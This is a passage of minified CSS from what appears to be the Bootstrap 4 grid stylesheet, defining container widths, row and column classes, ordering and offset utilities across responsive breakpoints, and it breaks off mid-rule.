(min-width:1200px){.container,.container-lg,.container-md,.container-sm,.container-xl{max-width:1140px}}.row{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-15px;margin-left:-15px}.no-gutters{margin-right:0;margin-left:0}.no-gutters>.col,.no-gutters>[class*=col-]{padding-right:0;padding-left:0}.col,.col-1,.col-10,.col-11,.col-12,.col-2,.col-3,.col-4,.col-5,.col-6,.col-7,.col-8,.col-9,.col-auto,.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-auto,.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-auto,.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-auto,.col-xl,.col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9,.col-xl-auto{position:relative;width:100%;padding-right:15px;padding-left:15px}.col{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-first{-ms-flex-order:-1;order:-1}.order-last{-ms-flex-order:13;order:13}.order-0{-ms-flex-order:0;order:0}.order-1{-ms-flex-order:1;order:1}.order-2{-ms-flex-order:2;order:2}.order-3{-ms-flex-order:3;order:3}.order-4{-ms-flex-order:4;order:4}.order-5{-ms-flex-order:5;order:5}.order-6{-ms-flex-order:6;order:6}.order-7{-ms-flex-order:7;order:7}.order-8{-ms-flex-order:8;order:8}.order-9{-ms-flex-order:9;order:9}.order-10{-ms-flex-order:10;order:10}.order-11{-ms-flex-order:11;order:11}.order-12{-ms-flex-order:12;order:12}.offset-1{margin-left:8.333333%}.offset-2{margin-left:16.666667%}.offset-3{margin-left:25%}.offset-4{margin-left:33.333333%}.offset-5{margin-left:41.666667%}.offset-6{margin-left:50%}.offset-7{margin-left:58.333333%}.offset-8{margin-left:66.666667%}.offset-9{margin-left:75%}.offset-10{margin-left:83.333333%}.offset-11{margin-left:91.666667%}@media (min-width:576px){.col-sm{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-sm-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-sm-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-sm-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-sm-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-sm-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-sm-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-sm-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-sm-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-sm-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-sm-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-sm-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-sm-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-sm-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-sm-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-sm-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-sm-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-sm-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-sm-first{-ms-flex-order:-1;order:-1}.order-sm-last{-ms-flex-order:13;order:13}.order-sm-0{-ms-flex-order:0;order:0}.order-sm-1{-ms-flex-order:1;order:1}.order-sm-2{-ms-flex-order:2;order:2}.order-sm-3{-ms-flex-order:3;order:3}.order-sm-4{-ms-flex-order:4;order:4}.order-sm-5{-ms-flex-order:5;order:5}.order-sm-6{-ms-flex-order:6;order:6}.order-sm-7{-ms-flex-order:7;order:7}.order-sm-8{-ms-flex-order:8;order:8}.order-sm-9{-ms-flex-order:9;order:9}.order-sm-10{-ms-flex-order:10;order:10}.order-sm-11{-ms-flex-order:11;order:11}.order-sm-12{-ms-flex-order:12;order:12}.offset-sm-0{margin-left:0}.offset-sm-1{margin-left:8.333333%}.offset-sm-2{margin-left:16.666667%}.offset-sm-3{margin-left:25%}.offset-sm-4{margin-left:33.333333%}.offset-sm-5{margin-left:41.666667%}.offset-sm-6{margin-left:50%}.offset-sm-7{margin-left:58.333333%}.offset-sm-8{margin-left:66.666667%}.offset-sm-9{margin-left:75%}.offset-sm-10{margin-left:83.333333%}.offset-sm-11{margin-left:91.666667%}}@media (min-width:768px){.col-md{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-md-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-md-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-md-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-md-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-md-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-md-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-md-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-md-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-md-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-md-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-md-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-md-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-md-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-md-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-md-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-md-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-md-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-md-first{-ms-flex-order:-1;order:-1}.order-md-last{-ms-flex-order:13;order:13}.order-md-0{-ms-flex-order:0;order:0}.order-md-1{-ms-flex-order:1;order:1}.order-md-2{-ms-flex-order:2;order:2}.order-md-3{-ms-flex-order:3;order:3}.order-md-4{-ms-flex-order:4;order:4}.order-md-5{-ms-flex-order:5;order:5}.order-md-6{-ms-flex-order:6;order:6}.order-md-7{-ms-flex-order:7;order:7}.order-md-8{-ms-flex-order:8;order:8}.order-md-9{-ms-flex-order:9;order:9}.order-md-10{-ms-flex-order:10;order:10}.order-md-11{-ms-flex-order:11;order:11}.order-md-12{-ms-flex-order:12;order:12}.offset-md-0{margin-left:0}.offset-md-1{margin-left:8.333333%}.offset-md-2{margin-left:16.666667%}.offset-md-3{margin-left:25%}.offset-md-4{margin-left:33.333333%}.offset-md-5{margin-left:41.666667%}.offset-md-6{margin-left:50%}.offset-md-7{margin-left:58.333333%}.offset-md-8{margin-left:66.666667%}.offset-md-9{margin-left:75%}.offset-md-10{margin-left:83.333333%}.offset-md-11{margin-left:91.666667%}}@media (min-width:992px){.col-lg{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-lg-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-lg-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-lg-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-lg-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-lg-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-lg-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-lg-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-lg-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-lg-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-lg-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-lg-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-lg-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-lg-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-lg-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.c
```
